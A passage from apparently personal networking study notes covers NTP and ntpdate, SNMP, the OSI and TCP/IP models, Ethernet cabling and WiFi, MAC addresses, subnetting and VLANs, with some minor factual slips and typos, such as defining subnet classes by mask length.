<p>Reference clocks are not directly connected to the network. Instead, the so-called <em>primary time servers</em> connect to the reference clock and synchronise their clocks with it. These servers have a stratum value of 1. For each layer you go down the chain, the stratum value increases by 1, since the distance from the reference clocks augments.</p>
<p><img src="Networking/Protocols/Resources/Images/NTP/Hierarchy.png" alt="" /></p>
<h1 id="synchronising-time-on-linux-with-ntpdate"><a class="header" href="#synchronising-time-on-linux-with-ntpdate">Synchronising time on Linux with <code>ntpdate</code></a></h1>
<p><code>ntpdate</code> is a useful utility for synching time on Linux machines through NTP. Its syntax is really simple:</p>
<p><code>ntpdate [server]</code></p>
<p>In order to set the date, it requires root privileges:</p>
<p><img src="Networking/Protocols/Resources/Images/NTP/wrong_time.png" alt="" /></p>
<p>Synching the time with a Windows machine on my network:</p>
<p><img src="Networking/Protocols/Resources/Images/NTP/synch.png" alt="" /></p>
<p>New time:</p>
<p><img src="Networking/Protocols/Resources/Images/NTP/synched_time.png" alt="" /></p>
<p>It can also be useful to only check how unsynched your time is with respect to another clock. You can do this by adding the <code>-q</code> option. This does not require root privileges.</p>
<p><img src="Networking/Protocols/Resources/Images/NTP/time_query.png" alt="" /></p>
<p>That's quite the difference! </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-62"><a class="header" href="#introduction-62">Introduction</a></h1>
<p>SNMP is a protocol which renders the service of providing monitoring of devices connected to a network. It can provide information such as online status, network bandwith, and even temperature.</p>
<p>This protocol works over UDP on port 161.</p>
<h1 id="agents"><a class="header" href="#agents">Agents</a></h1>
<p>Devices which are SNMP enabled are called <em>agents</em>. The monitored devices are known as <em>managed devices</em>, whilst the SNMP &quot;server&quot; is called the Network Management Station (NMS). The latter is responsible for gathering and organising the information it receives from the managed devices.</p>
<h1 id="objects"><a class="header" href="#objects">Objects</a></h1>
<p>Each agent has <em>objects</em>, some of which are standardised and others which are vendor specific. For example, a router might have name, uptime, interfaces, and routing table. Each object is assigned an <em>object identifier</em> (OID), which is a sequence of numbers separated by periods and resembling an IP address. OIDs are used for the identification of an object and are collectively stored in a Management Information Base (MIB) file.</p>
<h1 id="management-information-base-mib"><a class="header" href="#management-information-base-mib">Management Information Base (MIB)</a></h1>
<p>The MIB has follows a tree hierarchy and objects are organised in layers. Each layer is assigned a number and separated by a period in the OID, so in a sense, the OID is like a set of instructions how to get from the top of the tree to the desired object. Every agent is associated with a particular MIB.</p>
<h1 id="communicating-over-snmp"><a class="header" href="#communicating-over-snmp">Communicating over SNMP</a></h1>
<p>Three main ways of communication exist within SNMP:</p>
<ol>
<li>The NMS can query the managed devices about their current status.</li>
<li>The NMS can order managed devices to alter aspects of their configuration.</li>
<li>Managed devices can send messages to the NMS when certain events occur, such as an interface going down.</li>
</ol>
<h2 id="get-requests"><a class="header" href="#get-requests"><code>Get</code> Requests</a></h2>
<p>When the NMS wants to know about a specific object of an agent, it sends a <code>Get</code> request. These include <code>Get</code>, <code>GetNext</code>, and <code>GetBulk</code>. The agent then gives a <code>Get</code> response.</p>
<p><img src="Networking/Protocols/Resources/Images/SNMP/Get_request.png" alt="" /></p>
<h2 id="set-requests"><a class="header" href="#set-requests"><code>Set</code> Requests</a></h2>
<p><code>Set</code> requests are issued by the NMS, when it wants a certain agent to make a change to one of its objects.</p>
<h2 id="trap-and-inform"><a class="header" href="#trap-and-inform"><code>Trap</code> and <code>Inform</code></a></h2>
<p>These are used by agents when they want to inform the NMS of something such as the occurrence of a critical event.</p>
<p><img src="Networking/Protocols/Resources/Images/SNMP/trap_inform.png" alt="" /></p>
<p>Although they serve the same purpose, <code>Trap</code> and <code>Inform</code> messages are different. The latter is reliable - it waits for acknowledgement from the NMS. Should it not receive one, the <code>Inform</code> message would be resent.</p>
<h2 id="community-strings"><a class="header" href="#community-strings">Community strings</a></h2>
<p>SNMP versions 1 and 2 avail themselves of the so-called <em>community strings</em>. It is important to know that agents reply to SNMP requests only if they are accompanied by the appropriate community string, which is akin to a password. Every community string is associated with a set of permissions. These can be either read-only or read-write.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="the-osi-model"><a class="header" href="#the-osi-model">The OSI Model</a></h1>
<p>The OSI model is a conceptual protocol model which groups different protocols into <em>layers</em>, based on their function. Each layer is in turn only allowed to communicate with the layers immediately above and below it, taking data from the previous layer, processing it in some way and then forwarding it to the next layer. There are 7 layers in the OSI model and together they form the layer stack:</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/OSI_model.png" alt="" /></p>
<p>When data is sent from a device, this data is processed in each layer from top to bottom. Furthermore, each layer may augment the actual data transmitted by adding <em>headers</em> to the data.</p>
<p>At the site of arrival, data processing occurs in the reverse order. Each layer processes the corresponding header and acts upon it. Once it's done with its job, it forwards the remaining information up to the above layer. It's just like peeling an onion!</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/OSI_Data_flow.png" alt="" /></p>
<h2 id="the-application-layer"><a class="header" href="#the-application-layer">The Application Layer</a></h2>
<p>Here reside the myriad network applications and their application-layer protocols, such as HTTP, FTP, and SMTP. These are all tailored to the network application and serve very specific purposes. It is relatively easy to also develop and implement your own application-layer protocols. Pakcets of information at this layer are referred to as <em>messages</em>.</p>
<h2 id="the-presentation-layer"><a class="header" href="#the-presentation-layer">The Presentation layer</a></h2>
<p>The presentation layer is responsible for formatting and rendering data into an appropriate format. It handles data compression and decompression, encryption and decryption. Furthemore, it deals with the cross-OS compatibility of data. In other words, it describes how data should be <em>presented</em> to the application layer.</p>
<h2 id="the-session-layer"><a class="header" href="#the-session-layer">The Session Layer</a></h2>
<p>The session layer sets up, maintains, synchronises, and terminates the communication between different hosts. It includes functionality for user logon, authentication, management and logoff. Common protocols are ADSP, PPTP, and PAP.</p>
<h2 id="the-transport-layer"><a class="header" href="#the-transport-layer">The Transport Layer</a></h2>
<p>This layer provides the means through which messages are transmitted between endpoints. It provides services for addressing, message delivery, flow control and multiplexing. The two protocols which dominate this layer are TCP and UDP. Packets at this layer are known as <em>segments</em>.</p>
<h2 id="the-network-layer"><a class="header" href="#the-network-layer">The Network Layer</a></h2>
<p>Network-layer packets are called <em>datagrams</em> and this layer is responsible for moving these datagrams from host to host. It is provided with a source and destination address from the transport layer and then send the datagram on its path to the destination. Here resides the famous IP protocol, together with different routing protocols such as ICMP and DDP.</p>
<h2 id="the-data-link-layer"><a class="header" href="#the-data-link-layer">The Data Link Layer</a></h2>
<p>The data link (or just link) layer handles the transmition of <em>frames</em> between nodes as the packets are being routed to their destination. Protocols which fall in this layer are Wi-Fi, Ethernet, PPP and DOCSIS. This is where MAC and LLC reside.</p>
<h2 id="the-physical-layer"><a class="header" href="#the-physical-layer">The Physical Layer</a></h2>
<p>This layer takes on the job of transmitting individual bits from frames through physical links such as coaxial cable or fibre-optic cables. The protocols here vary depending on the medium used.</p>
<h1 id="the-tcpip-suite"><a class="header" href="#the-tcpip-suite">The TCP/IP Suite</a></h1>
<p>Similarly to the OSI model, the TCP/IP Suite is another conceptual networking model. Its names stems from two of the main protocols it is based on - TCP and IP - and was developed by the United States Department of Defence through a programme called DARPA. Its structure resembles that of the OSI model but has fewer layers. While this is the model used in modern networks, OSI still has a large influence on how networks are perceived and developed and most layer terminology actually refers to OSI, since there is an equivalence between OSI's layers and the layers of the TCP/IP Suite.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/TCP_IP_Suite.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-63"><a class="header" href="#introduction-63">Introduction</a></h1>
<p>The Physical layer is the lowest layer in the OSI model. It provides the electrical, mechanical, or electromagnetic means by which data is physically transferred between hosts. At the core of the Physical layer lie interfaces and mediums. Interfaces are what allow devices to send receive data, while mediums are what the data travels through between interfaces. Data at the physical layer is transmitted in <em>bits</em>, not bytes, hence why internet speeds are typically measured in multiples of bits per seconds or bps.</p>
<h1 id="mediums"><a class="header" href="#mediums">Mediums</a></h1>
<h2 id="copper-utp-cables"><a class="header" href="#copper-utp-cables">Copper (UTP) Cables</a></h2>
<p>The following standards are defined for copper cable Ethernet:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Speed</th><th style="text-align: center">Common Name</th><th style="text-align: center">IEEE Standard</th><th style="text-align: center">Informal Name</th><th style="text-align: center">Max Length</th></tr></thead><tbody>
<tr><td style="text-align: center">10 Mbps</td><td style="text-align: center">Ethernet</td><td style="text-align: center">802.3i</td><td style="text-align: center">10BASE-T</td><td style="text-align: center">100m</td></tr>
<tr><td style="text-align: center">100 Mbps</td><td style="text-align: center">Fast Ethernet</td><td style="text-align: center">802.3u</td><td style="text-align: center">100BASE-T</td><td style="text-align: center">100m</td></tr>
<tr><td style="text-align: center">1 Gbps</td><td style="text-align: center">Gigabit Ethernet</td><td style="text-align: center">802.3ab</td><td style="text-align: center">1000BASE-T</td><td style="text-align: center">100m</td></tr>
<tr><td style="text-align: center">10 Gbps</td><td style="text-align: center">10 Gig Ethernet</td><td style="text-align: center">802.3an</td><td style="text-align: center">10GBASE-T</td><td style="text-align: center">100m</td></tr>
</tbody></table>
</div>
<p>In the above nomenclature, <code>BASE</code> refers to baseband signaling, while <code>T</code> indicates <em>twisted pair</em>.</p>
<p>The copper cables described by the above standards are <em>Unshielded Twisted Pair</em> (UTP) cables which comprise 4 pairs of 8 wires.</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/UTP_cable.jpg" alt="" /></p>
<p>&quot;Unshielded&quot; means that the wires lack a metallic shield which increases their susceptibility to electrical interference. The &quot;twisted pair&quot; part is pretty self-explanatory and serves the purpose of reducing electromagnetic interference.</p>
<p>The RJ-45 jacks used for Ethernet have 8 pins - one pin per wire - however, not all pins are in use by all standards. 10BASE-T and 100BASE-T avail themselves only of pins 1, 2, 3, and 6. Moreover, different devices use these pins differently. Switches utilise pins 3 and 6 for <em>transmitting</em> (Tx) data and use pins 1 and 2 for <em>receiving</em> (Rx) data. This separation allows for <em>full-duplex</em> transmission - the device is able to both receive and send data at the same time. Most other devices, however, such as PCs, routers, and firewalls do the opposite - they use pins 3 and 6 for receiving and use pins 1 and 2 for sending data.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/UTP_10_100_BASE_T_straight_through.png" alt="" /></p>
<p>The above is a diagram of a <em>straight-through cable</em>, since there is a one-to-one correspondence between the pins. This is a simple approach, but unfortunately only works when devices of opposite types are being connected - you can't use it to connect a router to another router, a switch to another switch, or a PC to another PC. This is where <em>crossover cables</em> come. In these cables, different pins on one end correspond to different pins on the other.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/UTP_10_100_BASE_T_crossover.png" alt="" /></p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Device Type</th><th style="text-align: center">Tx Pins</th><th style="text-align: center">Rx Pins</th></tr></thead><tbody>
<tr><td style="text-align: center">Router</td><td style="text-align: center">1 and 2</td><td style="text-align: center">3 and 6</td></tr>
<tr><td style="text-align: center">Firewall</td><td style="text-align: center">1 and 2</td><td style="text-align: center">3 and 6</td></tr>
<tr><td style="text-align: center">PC</td><td style="text-align: center">1 and 2</td><td style="text-align: center">3 and 6</td></tr>
<tr><td style="text-align: center">Switch</td><td style="text-align: center">3 and 6</td><td style="text-align: center">1 and 2</td></tr>
</tbody></table>
</div>
<p>Most modern devices, however, support a feature called Auto MDI-X. This allows them to detect which pins their neighbour is transmitting data on and automatically adjust their own use of Tx and Rx pins to allow for proper communication. This makes the use of different types of cables often obsolete.</p>
<p>Higher speed standards avail themselves of all the pins. Additionally, in 1000BASE-T and 10GBASE-T are bidirectional and allow for both transmission and reception which allows for greater speeds.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/UTP_1000_10GBASE_T.png" alt="" /></p>
<h2 id="fibre-optic-cables"><a class="header" href="#fibre-optic-cables">Fibre-Optic Cables</a></h2>
<p>Fibre-Optic cables are a new generation of cables. Instead of transferring electrical signals through copper wiring, these cables conduct signals in the form of <em>light</em>, which makes them immune to EMI. In order to use fibre-optics, a special type of connector called SFP is required, which is short for <em>Small Form-Factor Pluggable</em> and looks like this:</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/0e/QSFP-40G-SR4_Transceiver.jpg" alt="" /></p>
<p>Data is transferred through the fibre-optic cable which has two connections on each end - one for sending and one for receiving:</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Lc-sc-fiber-connectors.jpg" alt="" /></p>
<p>The fibre-optic cable is comprised of 4 main layers. The innermost layer is the fibreglass core, which is what the light travels through. This core is enveloped in a cladding layer which reflects the light beam travelling through the cable. Around the cladding is a protective buffer, which is in turn wrapped in the outer jacket.</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Singlemode_fibre_structure.svg/1024px-Singlemode_fibre_structure.svg.png" alt="" /></p>
<p>There are two main types of fibre-optic cables in the wild. The first type is multi-mode fibre which allows for light to enter at multiple angles. It has a larger glass core and allows for a greater transmission distance than UTP and is also cheaper than single-mode fibre. Single-mode fibre, on the other hand allows for light to enter only at a single angle, called a <em>mode</em>, and has a much greater maximum distance than that of multi-mode (step index).</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Optical_fiber_types.svg/1920px-Optical_fiber_types.svg.png" alt="" /></p>
<p>The following fibre-optic cable standards are defined:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Informal Name</th><th style="text-align: center">IEEE Standard</th><th style="text-align: center">Speed</th><th style="text-align: center">Cable Type</th><th style="text-align: center">Maximum Length</th></tr></thead><tbody>
<tr><td style="text-align: center">1000BASE-LX</td><td style="text-align: center">802.3z</td><td style="text-align: center">1 Gbps</td><td style="text-align: center">Multi- or single-mode</td><td style="text-align: center">550 m (MM), 5 km (SM)</td></tr>
<tr><td style="text-align: center">10GBASE-SR</td><td style="text-align: center">802.3ae</td><td style="text-align: center">10 Gbps</td><td style="text-align: center">Multi-mode</td><td style="text-align: center">400 m</td></tr>
<tr><td style="text-align: center">10GBASE-LR</td><td style="text-align: center">802.3ae</td><td style="text-align: center">10 Gbps</td><td style="text-align: center">Single-mode</td><td style="text-align: center">10 km</td></tr>
<tr><td style="text-align: center">10GBASE-ER</td><td style="text-align: center">802.3ae</td><td style="text-align: center">10 Gbps</td><td style="text-align: center">Single-mode</td><td style="text-align: center">30 km</td></tr>
</tbody></table>
</div>
<h1 id="wireless-wifi"><a class="header" href="#wireless-wifi">Wireless (WiFi)</a></h1>
<p>Wireless LANs (WLANs) use electromagnetic radiation for the transfer of data. The standards WLANs are defined in IEEE 802.11. Although commonly called &quot;WiFi&quot;, this is actually a trademark of the <em>WiFi Alliance</em> which certifies devices for compliance with the IEEE 802.11 standards, but is not directly connected with it.</p>
<p>A corollary of WiFi's using radio waves to transmit data is that <em>all</em> devices within range receive <em>all</em> frames. It is, therefore, paramount that this data is encrypted. Furthermore, due to the fact that multiple devices will be using the same frequency ranges to transmit data, it is of the utmost importance that collisions are avoided. This is typically actuated by <em>CSMA/CA</em> - Carrier Sense Multiple Access will Collision Avoidance. Essentially, when this technique is in use, the device will wait for the channel to be free before transmitting any data by checking it periodically. An additional feature is also supported whereby the device will send a Request-To-Send (RTS) packet and will wait for a Clear-To-Send (CTS) response.</p>
<p>WiFi uses 3 major <em>frequency bands (ranges)</em>. The first is 2.4 GHz and it covers the frequencies from 2.400 GHz to 2.4835 GHz. Next is the 5 GHz band which ranges from 5.150 GHz to 5.825 GHz and is further subdivided into 4 smaller bands - from 5.150 to 5.250 GHz, from 5.250 to 5.350, from 5.470 to 5.725, and from 5.725 to 5.825. The last band is the 6 GHz band and it was introduced with WiFi 6.</p>
<p>While 2.4 GHz provides further reach and better obstacle penetration, it is typically used by more devices and may have higher interference than 5 or 6 GHz.</p>
<p>Each band is divided into <em>channels</em> with a different width. 2.4 GHz is comprised of 13 channels, each of width 22 MHz although this may depend on your country. These channels may overlap with each other, so it is crucial that non-overlapping ones are chosen for the access points in a certain area to avoid interference. A typical configuration is to use channels 1, 6, and 11 in a honeycomb pattern, since those channels have no overlap with each other.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/WiFi_honeycomb.png" alt="" /></p>
<p>There are a few standards defined in IEEE 802.11:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Standard</th><th style="text-align: center">Frequencies</th><th style="text-align: center">Max Speed</th><th style="text-align: center">Name</th></tr></thead><tbody>
<tr><td style="text-align: center">802.11</td><td style="text-align: center">2.4 GHz</td><td style="text-align: center">2 Mbps</td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">802.11b</td><td style="text-align: center">2.4 GHz</td><td style="text-align: center">11 Mbps</td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">802.11a</td><td style="text-align: center">5 GHz</td><td style="text-align: center">54 Mbps</td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">802.11g</td><td style="text-align: center">2.4 GHz</td><td style="text-align: center">54 Mbps</td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">802.11n</td><td style="text-align: center">2.4 GHz / 5 GHz</td><td style="text-align: center">600 Mbps</td><td style="text-align: center">Wi-Fi 4</td></tr>
<tr><td style="text-align: center">802.11ac</td><td style="text-align: center">5 GHz</td><td style="text-align: center">6.93 Gbps</td><td style="text-align: center">Wi-Fi 5</td></tr>
<tr><td style="text-align: center">802.11ax</td><td style="text-align: center">2.4 GHz / 5 GHz / 6 GHz</td><td style="text-align: center"><code>4 * 802.11ac</code></td><td style="text-align: center">Wi-Fi 6</td></tr>
</tbody></table>
</div>
<h2 id="service-sets"><a class="header" href="#service-sets">Service Sets</a></h2>
<p>The IEEE 802.11 standard also defines a different kinds of <em>service sets</em>. These are groups of wireless network devices and are organised into three main types:</p>
<ul>
<li>Independent</li>
<li>Infrastructure</li>
<li>Mesh</li>
</ul>
<p>All devices in a service set share the same <em>service set identifier (SSID)</em>. This is a human-readable name which does <em>not</em> have to be unique. Following is an example of the SSIDs visible to my current device.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/WiFi_SSIDs.png" alt="" /></p>
<h3 id="independent-basic-service-set-ibss"><a class="header" href="#independent-basic-service-set-ibss">Independent Basic Service Set (IBSS)</a></h3>
<p>An IBSS is a wireless network in which a small number of wireless devices are connected directly to each other without an access point. It is also commonly referred to as an <em>ad hoc network</em>. It can be useful for some tasks such as small file transfers (i.e. AirDrop), but is not scalable beyond a few devices.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/WiFi_IBSS.png" alt="" /></p>
<h3 id="basic-service-set-bss"><a class="header" href="#basic-service-set-bss">Basic Service Set (BSS)</a></h3>
<p>A BSS is a network infrastructure in which the clients are all connected to an access point, but not to each other. All traffic must go through the AP, even if two devices that want to communicate are within range of one another. A BSS is characterised by a <em>Basic Service Set ID (BSSID)</em> and an SSID. The former is the MAC address of the AP and must be unique, while the latter may be shared across multiple access points.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/WiFi_BSS.png" alt="" /></p>
<p>In order to connect to a BSS, wireless devices request to be <em>associated</em> with it. Once a device has been associated with an access point, it is referred to as a <em>station</em>.</p>
<p>The area around an AP where its signal is usable is typically called a <em>Basic Service Area (BSA)</em>.</p>
<h3 id="extended-service-set-ess"><a class="header" href="#extended-service-set-ess">Extended Service Set (ESS)</a></h3>
<p>For the creation of larger WLANs, which span more than the range of a single AP, an <em>Extended Service Set (ESS)</em> is utilised. In it, multiple APs are connected by a wired network. Each BSS shares the same SSID, but has a unique BSSID. Furthermore, the BSSs use different channels in order to avoid interference. </p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/WiFi_ESS.png" alt="" /></p>
<p>Clients are able to pass between APs without the need to reconnect, which is referred to as <em>roaming</em>. In order to ensure as seamless an experience as possible, the BSAs should overlap ~10-15%.</p>
<h3 id="mesh-basic-service-set-mbss"><a class="header" href="#mesh-basic-service-set-mbss">Mesh Basic Service Set (MBSS)</a></h3>
<p>An MBSS is employed when difficulties arise with running a direct Ethernet connection through every AP. Mesh access points utilise two radios - one for the provision of a BSS to the wireless clients and one for inter-AP communication, called a <em>backhaul network</em>. At least one AP must be connected to the wired network and it is referred to as <em>Root Access Point (RAP)</em>. The rest of the APs are called <em>Mesh Access Points (MAPs)</em>. A protocol is employed to determine the best path for traffic in the MBSS.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/WiFi_MBSS.png" alt="" /></p>
<h3 id="the-distribution-system"><a class="header" href="#the-distribution-system">The Distribution System</a></h3>
<p>Most wireless networks typically aren't standalone networks, but instead provide a means for wireless devices to connect to a wired network. This wired network is referred to as the <em>Distribution System (DS)</em>. Each BSS or ESS gets mapped to a <a href="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/../VLANs.html">VLAN</a> on the wired network. Moreover, an AP is capable of providing multiple wireless LANs, each with a unique SSID and BSSID, where the latter is typically achieved by incrementing the last digit of the BSSID by one. IN this case, each WLAN gets mapped to a separate VLAN in the wired network.</p>
<h2 id="ap-operation-modes"><a class="header" href="#ap-operation-modes">AP Operation Modes</a></h2>
<h3 id="repeater-mode"><a class="header" href="#repeater-mode">Repeater Mode</a></h3>
<p>An AP in repeater mode can be utilised to extend the range of a BSS. The repeater simply retransmits any signal it receives from the AP. It is recommended that the repeater support at least two radios so that it can receive from the AP on one channel and then retransmit the data on a different channel, so as to avoid cutting the overall throughput.</p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/AP_Repeater.png" alt="" /></p>
<h3 id="workgroup-bridge"><a class="header" href="#workgroup-bridge">Workgroup Bridge</a></h3>
<p>A workgroup bridge (WGP) acts as a client of another AP and can be used to connect wired devices to the wireless network. </p>
<p><img src="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/Resources/Images/AP_WGB.png" alt="" /></p>
<h3 id="outdoor-bridge"><a class="header" href="#outdoor-bridge">Outdoor Bridge</a></h3>
<p>An outdoor bridge is used to connect networks over large distances without a physical cable. This is achieved by APs with special directional antennas.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-64"><a class="header" href="#introduction-64">Introduction</a></h1>
<p>There are two major standards which govern how data is transmitted at the datalink layer. The first on is a protocol called <a href="Networking/The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/../Protocols/Ethernet%20(IEEE%20802.3).html">Ethernet</a> and it describes the transfer of data in wired LANs. It is defined in the IEEE 802.3 standard.</p>
<p>The second one is the IEEE 802.11 WLAN standard and it describes how data is transferred in <em>wireless</em> networks over WiFi.</p>
<h1 id="mac-addresses"><a class="header" href="#mac-addresses">MAC Addresses</a></h1>
<p>Both protocols avail themselves of the so-called <em>MAC addresses</em>. In order words, MAC addresses operate at the datalink layer. A MAC address is a 6-byte (48-bit) value assigned to every device when it is manufactured and typically takes the form of <code>XX:XX:XX:XX:XX:XX</code> in hexadecimal. It may also be referred to as a burnt-in address (BIA). This address is globally unique and no two devices in the world should have the same MAC addresses.</p>
<p>The first 3 bytes of every MAC addresses are the <em>Organisationally Unique Identifier (OUI)</em> and it is assigned to the company making the device. All devices manufactured by this company will share the same 3 bytes - the company's OUI. The second half the MAC address is unique for every device and is what identifies it.</p>
<p>MAC addresses are used extensively in switches and routers at the datalink layer.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-address-translation"><a class="header" href="#network-address-translation">Network Address Translation</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-65"><a class="header" href="#introduction-65">Introduction</a></h1>
<p>Subnetting is a way to logically divide a network into smaller subnetworks. The devices that belong to the same subnet are identified by identical most-significant bits in their local IP addresses. </p>
<p>A local IP address is divided into two parts - the <em>network number (routing prefix)</em> and the <em>host identifier (rest field).</em> The former is what identifies the network that the IP address belongs to and is shared by devices in the same subnet. The rest field identifies the actual host on the network.</p>
<p>Every IPv4 address is 32 bits in length, however, the size of the network number and the host identifier is variable and is defined for each subnet by the <em>subnet mask</em>. The subnet mask also takes the form of an IPv4 address which is read entirely left to right. Essentially, the bits from the subnet mask that are set to 1 indicate the bits from the IP address are the network number. The bits in the subnet mask that are set to 0 indicate the bits from the IP address which represent the host identifier.</p>
<p>For example, for the IP address <code>192.168.0.123</code> a subnet mask of <code>11111111.11111111.11111111.00000000</code> (<code>255.255.255.0</code>) would indicate that <code>192.168.0</code> is the network number and that <code>123</code> is the host identifier. Since the last 8 bits are used for the host identifier, this particular subnet can have a total of \( 2^8 - 2 = 254 \) devices - where one IP is reserved for the actual network's address (<code>192.168.0.0</code>) and one is reserved for the broadcast address.</p>
<p><img src="Networking/Resources/Images/Subnet_Classes_Nice.png" alt="" /></p>
<p>Typically, subnet masks would be nice and split the network at the octets of the IP address, but this is not always the case. It is then less intuitive how to read and IP address in terms of its octets, so you would typically need to understand it in terms of bits. For example, you could be given the subnet mask of <code>11111111.11111111.11111111.10000000</code> (<code>255.255.255.128</code>). In this case, the network would only have  \( 2^7 - 2 = 126 \) possible hosts. In general for each bit the subnet mask added, the number of possible hosts is halved, while for every bit taken away, it is doubled and the number of possible hosts is given by \( 2^n - 2 \), where \( n = 32 - \text{the number of active bits in the subnet mask} \).</p>
<p>Subnets are divided into classes depending on the number of bits that they have set to 1. Class A has anywhere between 9 and 16 bits set, Class B has between 17 and 24 bits set, and class C has between 25 and 32 bits set.</p>
<p>There is also a short-hand notation for specifying the subnet mask of a particular network - CIDR notation. You simply specify the network address followed by a <code>/</code> and the number of active bits in the subnet mask. So, a subnet with a network address of <code>192.168.0.0</code> and a subnet mask of <code>255.255.255.0</code> will be written as <code>192.168.0./24</code>.</p>
<p>Following is a chart of these classes together with their CIDR notations and the possible number of hosts (you should subtract 2 from the corresponding entry).</p>
<p><img src="Networking/Resources/Images/Subnets_Table.png" alt="" /></p>
<p>To get the IP notation for the subnet mask, simply replace <code>x</code> with the value from the column which pertains to the chosen CIDR notation.</p>
<p>You might notice the existence of <code>/31</code> and <code>/32</code> subnets. The rule for subtracting 2 from the number of hosts isn't applied since these networks are too small to require a broadcast address. Typically, a <code>/31</code> subnet is used in a point-to-point network (usually between two routers).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-66"><a class="header" href="#introduction-66">Introduction</a></h1>
<p>Virtual LANs provide the means for logically separating a LAN at Layer 2 and can be thought of as the Layer 2 counterpart to the Layer 3 subnets. The reasons to do this are typically bandwidth- and security-related and have to do with broadcast frames.</p>
<p>Imagine the following LAN, without VLANs configured:</p>
<p><img src="Networking/Resources/Images/VLAN_not.png" alt="" /></p>
<p>The Engineering and Sales departments are assigned to different subnets.</p>
<p>If PC1 wants to send a broadcast frame, or even just an unknown unicast frame, to the Engineering department, it has to send it to the switch with a destination MAC address of <code>FF:FF:FF:FF:FF:FF</code>. You would expect that the switch would now only broadcast this frame to the Engineering department, but since there are no VLANs configured and the switch isn't aware of subnets - it only works with Layer 2, - the frame is actually broadcasted to the Sales department, as well! This is suboptimal because there is unnecessary traffic sent (the frame was meant for the Engineering department) and because it may unnecessarily leak information to the Sales department which poses a security risk.</p>
<p>One solution is to buy separate switches for the two departments but this is not very budget-friendly. Another solution is to configure separate virtual LANs for the Engineering and Sales departments. This is done in the switch and is configured with respect to the switch's interfaces -it is <em>not</em> done with respect to the MAC addresses. A group of interfaces is grouped into a VLAN and any host connected to that interface becomes part of the VLAN.</p>
<p><img src="Networking/Resources/Images/VLAN.png" alt="" /></p>
<p>In the above example, the switch's interfaces <code>FO/0</code>, <code>FO/1</code>, <code>FO/2</code>, <code>FO/3</code> have been grouped into VLAN10, while <code>FO/4</code>, <code>FO/5</code>, <code>FO/6</code>, <code>FO/7</code> have been configured into VLAN20. These interfaces are referred to as <em>access ports</em>, since they only allow traffic from a single VLAN. Now, whenever PC1 sends out a broadcast frame with <code>FF:FF:FF:FF:FF:FF</code> as its destination, the switch is only going to broadcast the frame to the interfaces in VLAN10. </p>
<p>But what happens when PC1 wants to communicate with a device that is in the Sales department? In this case, PC1 sets the destination MAC to the MAC of the router which will then replace the source MAC with its own and forward the frame to the correct destination. In other words, all traffic that crosses between VLANs must be routed by the router.</p>
<h2 id="trunk-ports"><a class="header" href="#trunk-ports">Trunk Ports</a></h2>
<p>Typically, every interface can only forward traffic from a single VLAN. This, however, results in the wasting of many interfaces. Such is the case with the above router - there is an interface taken for every VLAN. In order to remedy this, the so-called <em>trunk ports</em> can be used.</p>
<p><img src="Networking/Resources/Images/VLAN_trunk.png" alt="" /></p>
<p>However, since a trunk port allows for traffic from many VLANs, it is not possible to determine to which VLAN the traffic belongs solely based on the interface it is flowing through. Therefore, a way of <em>tagging</em> each frame must be implemented by the switch. There are two main protocols for achieving this - the now obsolescent ISL (Inter-Switch Link) protocol, which is a propriety Cisco protocol which is not even used by Cisco anymore, and the <a href="Networking/Protocols/Ethernet%20(IEEE%20802.3).html#8021q-encapsulation">IEEE 802.1Q standard</a> (also called &quot;dot1q&quot;).</p>
<p><img src="Networking/Resources/Images/VLAN_trunking.png" alt="" /></p>
<p>Due to the size of the VID field in the dot1q tag, there are a total of \( 2^{12} = 4096 \) VLANs. Two of them - the first and last one - are reserved and cannot be used. Therefore, the actual range for VLANs is from 1 to 4094. This range is further subdivided:</p>
<ul>
<li>Normal VLANs: 1 - 1005</li>
<li>Extended VLANs: 1006 - 4094</li>
</ul>
<p>Very rarely, the extended range may not be supported by older switches.</p>
